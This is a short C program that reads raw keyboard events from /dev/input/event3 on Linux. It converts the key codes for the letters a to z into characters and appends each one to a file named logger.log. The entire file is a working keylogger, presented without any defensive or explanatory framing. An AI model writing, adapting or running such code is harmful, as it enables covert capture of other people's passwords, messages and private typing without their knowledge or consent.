#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
int arr[] = {30, 48, 46, 32, 18, 33, 34, 35, 23, 36, 37, 38, 50,
             49, 24, 25, 16, 19, 31, 20, 22, 47, 17, 45, 21, 44};
int main() {
  int fd = open("/dev/input/event3", O_RDONLY);
  int logger = open("logger.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
  char buffer[1024];
  int pos = 0;
  struct input_event ev;
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(ev));
    if (n != sizeof(ev))
      continue;
    if (ev.type == EV_KEY) {
      if (ev.value == 1) {
        for (int i = 0; i < 26; i++) {
          if (arr[i] == ev.code) {
            // printf("read %c\n", (i + 'a'));
            buffer[pos++] = (i + 'a');
          }
          write(logger, buffer, pos);
          pos = 0;
        }
      }
    }
  }
}
